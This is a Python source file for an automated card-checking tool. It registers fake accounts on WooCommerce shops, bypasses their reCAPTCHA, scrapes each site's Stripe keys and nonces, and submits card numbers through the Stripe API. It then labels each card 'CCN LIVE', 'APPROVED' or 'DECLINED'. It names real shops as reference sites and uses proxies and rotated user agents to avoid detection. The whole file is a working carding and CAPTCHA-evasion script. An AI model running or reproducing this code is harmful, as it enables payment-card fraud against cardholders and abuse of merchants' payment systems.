"""
Stripe Auto Auth API (WooCommerce Stripe)
=========================================
Professional async WooCommerce Stripe auth flow:
1. GET my-account/ → parse woocommerce-register-nonce
2. POST my-account/ (register) with optional reCAPTcha bypass
3. GET my-account/add-payment-method/ → parse publishableKey, accountId, createSetupIntentNonce
4. POST api.stripe.com/v1/payment_methods
5. POST wp-admin/admin-ajax.php (action=create_setup_intent, wcpay-payment-method, _ajax_nonce)
Reference sites: melearning.co.uk, starr-shop.eu
"""

import re
import json
import asyncio
import random
import string
import base64
import logging
from typing import Dict, Optional, Tuple
from urllib.parse import urlparse, parse_qs

import aiohttp

logger = logging.getLogger(__name__)

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
]


def _random_email() -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=8)) + "@gmail.com"


def _random_password() -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=12))


def _captcha_detected(text: str) -> bool:
    if not text:
        return False
    t = text.lower()
    return any(
        re.search(p, t)
        for p in [
            r"captcha",
            r"recaptcha",
            r"g-recaptcha",
            r"hcaptcha",
            r"data-sitekey",
            r"cf-chl-captcha",
            r"cloudflare",
            r"are you human",
            r"verify you are human",
        ]
    )


async def _recaptcha_bypass(session: aiohttp.ClientSession, page_html: str, page_url: str) -> Optional[str]:
    """Async reCAPTcha bypass: anchor → reload → rresp token."""
    sitekey_m = re.search(r'data-sitekey=["\']([^"\']+)["\']', page_html, re.IGNORECASE)
    if not sitekey_m:
        return None
    sitekey = sitekey_m.group(1)
    origin_encoded = base64.b64encode(page_url.encode()).decode().rstrip("=")
    anchor_url = (
        f"https://www.google.com/recaptcha/api2/anchor?"
        f"ar=1&k={sitekey}&co={origin_encoded}&hl=en&v=...&size=invisible"
    )
    reload_url = f"https://www.google.com/recaptcha/api2/reload?k={sitekey}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        async with session.get(anchor_url, headers=headers, timeout=aiohttp.ClientTimeout(total=12)) as resp:
            if resp.status != 200:
                return None
            anchor_text = await resp.text()
        token_m = re.search(r'value=["\']([^"\']+)["\']', anchor_text)
        if not token_m:
            return None
        token = token_m.group(1)
        parsed = urlparse(anchor_url)
        params = parse_qs(parsed.query)
        post_data = {
            "v": (params.get("v") or [""])[0],
            "reason": "q",
            "c": token,
            "k": sitekey,
            "co": (params.get("co") or [""])[0],
            "hl": "en",
            "size": "invisible",
        }
        post_headers = {
            **headers,
            "Referer": anchor_url,
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.google.com",
        }
        async with session.post(reload_url, headers=post_headers, data=post_data, timeout=aiohttp.ClientTimeout(total=15)) as r2:
            if r2.status != 200:
                return None
            reload_text = await r2.text()
        rresp_m = re.search(r'\["rresp","([^"]+)"', reload_text)
        if not rresp_m:
            return None
        return rresp_m.group(1)
    except Exception as e:
        logger.debug(f"reCAPTcha bypass failed: {e}")
        return None


async def auto_stripe_auth(
    site_url: str,
    card: str,
    session: Optional[aiohttp.ClientSession] = None,
    proxy: Optional[str] = None,
    timeout_seconds: int = 45,
) -> Dict:
    """
    Full WooCommerce Stripe auth: register → add-payment-method → Stripe PM → create_setup_intent.
    card: "cc|mm|yy|cvv"
    Returns: { success, response, message, card, site, payment_method_id?, login_email?, login_password? }
    """
    result = {
        "success": False,
        "response": "UNKNOWN",
        "message": "Unknown error",
        "card": card,
        "site": site_url.rstrip("/"),
        "payment_method_id": None,
        "login_email": None,
        "login_password": None,
    }
    parts = card.replace(" ", "").split("|")
    if len(parts) < 4:
        result["message"] = "Invalid card format"
        return result
    cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
    exp_year = ano[-2:] if len(ano) == 4 else ano

    url = site_url.strip().rstrip("/")
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    base = url

    ua = random.choice(USER_AGENTS)
    headers_base = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": ua,
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
    }

    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=timeout_seconds)
    own_session = session is None
    if session is None:
        session = aiohttp.ClientSession(timeout=timeout, connector=connector)

    try:
        # 1) GET my-account/ → nonce
        async with session.get(
            f"{base}/my-account/",
            headers=headers_base,
            proxy=proxy,
        ) as resp:
            if resp.status != 200:
                result["response"] = "SITE_HTTP_ERROR"
                result["message"] = f"my-account returned {resp.status}"
                return result
            html_reg = await resp.text()

        nonce_m = re.search(r'name=["\']woocommerce-register-nonce["\'][^>]+value=["\']([^"\']+)["\']', html_reg)
        if not nonce_m:
            nonce_m = re.search(r'value=["\']([^"\']+)["\'][^>]+name=["\']woocommerce-register-nonce["\']', html_reg)
        if not nonce_m:
            nonce_m = re.search(r'woocommerce-register-nonce["\']?\s*value=["\']([^"\']+)["\']', html_reg)
        if not nonce_m:
            result["response"] = "SITE_ERROR"
            result["message"] = "Registration nonce not found"
            return result
        reg_nonce = nonce_m.group(1)

        email = _random_email()
        password = _random_password()
        result["login_email"] = email
        result["login_password"] = password

        data_register = {
            "email": email,
            "password": password,
            "wc_order_attribution_source_type": "typein",
            "wc_order_attribution_referrer": "(none)",
            "woocommerce-register-nonce": reg_nonce,
            "_wp_http_referer": "/my-account/",
            "register": "Register",
        }
        reg_headers = {
            **headers_base,
            "Origin": base,
            "Referer": f"{base}/my-account/",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }

        async with session.post(
            f"{base}/my-account/",
            headers=reg_headers,
            data=data_register,
            proxy=proxy,
        ) as resp:
            html1 = await resp.text()

        if _captcha_detected(html1):
            g_token = await _recaptcha_bypass(session, html1, f"{base}/my-account/")
            if g_token:
                data_register["g-recaptcha-response"] = g_token
                async with session.post(
                    f"{base}/my-account/",
                    headers=reg_headers,
                    data=data_register,
                    proxy=proxy,
                ) as resp:
                    html1 = await resp.text()
            if _captcha_detected(html1) or ("registered" not in html1.lower() and "dashboard" not in html1.lower() and "logout" not in html1.lower()):
                result["response"] = "CAPTCHA_BLOCK"
                result["message"] = "Registration captcha failed"
                return result

        await asyncio.sleep(0.3)

        # 2) GET add-payment-method/
        pay_headers = {
            **headers_base,
            "Referer": f"{base}/my-account/payment-methods/",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }
        async with session.get(
            f"{base}/my-account/add-payment-method/",
            headers=pay_headers,
            proxy=proxy,
        ) as resp:
            if resp.status != 200:
                result["response"] = "SITE_HTTP_ERROR"
                result["message"] = f"add-payment-method returned {resp.status}"
                return result
            html_pay = await resp.text()

        if _captcha_detected(html_pay):
            g_token = await _recaptcha_bypass(session, html_pay, f"{base}/my-account/add-payment-method/")
            if not g_token:
                result["response"] = "CAPTCHA_BLOCK"
                result["message"] = "Payment page captcha failed"
                return result
            # Re-fetch with token in cookie or retry after bypass not always required for GET
            async with session.get(
                f"{base}/my-account/add-payment-method/",
                headers=pay_headers,
                proxy=proxy,
            ) as resp:
                html_pay = await resp.text()

        pks_m = re.search(r'"publishableKey"\s*:\s*"([^"]+)"', html_pay)
        acct_m = re.search(r'"accountId"\s*:\s*"([^"]+)"', html_pay)
        nonce_m = re.search(r'"createSetupIntentNonce"\s*:\s*"([^"]+)"', html_pay)
        if not nonce_m:
            nonce_m = re.search(r'createSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']', html_pay)
        if not nonce_m:
            nonce_m = re.search(r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"', html_pay)
        if not nonce_m:
            nonce_m = re.search(r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([^"\']+)["\']', html_pay)
        if not pks_m or not acct_m or not nonce_m:
            result["response"] = "STRIPE_KEYS_MISSING"
            result["message"] = "publishableKey/accountId/createSetupIntentNonce not found"
            return result
        pks = pks_m.group(1)
        acct = acct_m.group(1)
        nonce = nonce_m.group(1)

        # 3) POST api.stripe.com/v1/payment_methods
        stripe_headers = {
            "authority": "api.stripe.com",
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": ua,
        }
        stripe_data = {
            "billing_details[name]": "",
            "billing_details[email]": email,
            "billing_details[address][country]": "US",
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": exp_year,
            "card[exp_month]": mes,
            "key": pks,
            "_stripe_account": acct,
        }
        async with session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=stripe_headers,
            data=stripe_data,
            proxy=proxy,
        ) as resp:
            pm_text = await resp.text()
        try:
            pm_json = json.loads(pm_text)
        except json.JSONDecodeError:
            result["response"] = "STRIPE_PM_ERROR"
            result["message"] = pm_text[:100]
            return result
        if "error" in pm_json:
            err = pm_json["error"]
            code = err.get("code", "")
            msg = err.get("message", "Unknown")
            result["message"] = msg
            if code in ("incorrect_cvc", "invalid_cvc", "incorrect_zip", "postal_code_invalid") or any(
                x in msg.lower() for x in ["cvc", "security code", "zip", "postal"]
            ):
                result["success"] = True
                result["response"] = "CCN LIVE"
            else:
                result["response"] = "DECLINED"
            return result
        pm_id = pm_json.get("id")
        if not pm_id:
            result["response"] = "STRIPE_PM_ERROR"
            result["message"] = "No payment method id"
            return result
        result["payment_method_id"] = pm_id

        # 4) POST admin-ajax.php create_setup_intent (WooCommerce Payments) or create_and_confirm_setup_intent (WooCommerce Stripe Gateway)
        def _ajax_submit(action_name: str, field_name: str) -> Tuple[str, aiohttp.FormData]:
            form = aiohttp.FormData()
            form.add_field("action", action_name)
            form.add_field(field_name, pm_id)
            form.add_field("_ajax_nonce", nonce)
            return field_name, form

        ajax_headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": base,
            "Referer": f"{base}/my-account/add-payment-method/",
            "User-Agent": ua,
            "X-Requested-With": "XMLHttpRequest",
        }
        # Try WooCommerce Payments first (create_setup_intent, wcpay-payment-method)
        _, form = _ajax_submit("create_setup_intent", "wcpay-payment-method")
        ajax_headers["Content-Type"] = form.content_type
        async with session.post(
            f"{base}/wp-admin/admin-ajax.php",
            headers=ajax_headers,
            data=form,
            proxy=proxy,
        ) as resp:
            ajax_text = await resp.text()

        # Fallback: WooCommerce Stripe Gateway uses create_and_confirm_setup_intent + wc-stripe-payment-method
        try:
            first_json = json.loads(ajax_text)
            if not first_json.get("success"):
                _, form2 = _ajax_submit("create_and_confirm_setup_intent", "wc-stripe-payment-method")
                ajax_headers["Content-Type"] = form2.content_type
                async with session.post(
                    f"{base}/wp-admin/admin-ajax.php",
                    headers=ajax_headers,
                    data=form2,
                    proxy=proxy,
                ) as resp2:
                    ajax_text = await resp2.text()
        except json.JSONDecodeError:
            pass

        try:
            ajax_json = json.loads(ajax_text)
            if ajax_json.get("success") is True:
                result["success"] = True
                result["response"] = "APPROVED"
                result["message"] = "Card authenticated"
                return result
            data = ajax_json.get("data", {})
            err_msg = (data.get("error") or {}).get("message", ajax_text)
            if isinstance(err_msg, dict):
                err_msg = str(err_msg)
            result["message"] = (err_msg or ajax_text)[:200]
            err_upper = result["message"].upper()
            if any(
                x in err_upper
                for x in [
                    "SECURITY CODE",
                    "CVC",
                    "CVV",
                    "INCORRECT_CVC",
                    "POSTAL",
                    "ZIP",
                    "ADDRESS",
                    "AVS",
                    "AUTHENTICATION",
                    "3D SECURE",
                    "INSUFFICIENT",
                    "INCORRECT NUMBER",
                ]
            ):
                result["success"] = True
                result["response"] = "CCN LIVE"
            else:
                result["response"] = "DECLINED"
            return result
        except json.JSONDecodeError:
            if "success" in ajax_text.lower():
                result["success"] = True
                result["response"] = "APPROVED"
                result["message"] = "Setup successful"
            else:
                result["response"] = "DECLINED"
                result["message"] = ajax_text[:150]
            return result
    except asyncio.TimeoutError:
        result["response"] = "TIMEOUT"
        result["message"] = "Request timed out"
        return result
    except aiohttp.ClientError as e:
        result["response"] = "NETWORK_ERROR"
        result["message"] = str(e)[:80]
        return result
    except Exception as e:
        result["response"] = "ERROR"
        result["message"] = str(e)[:100]
        return result
    finally:
        if own_session and session:
            await session.close()
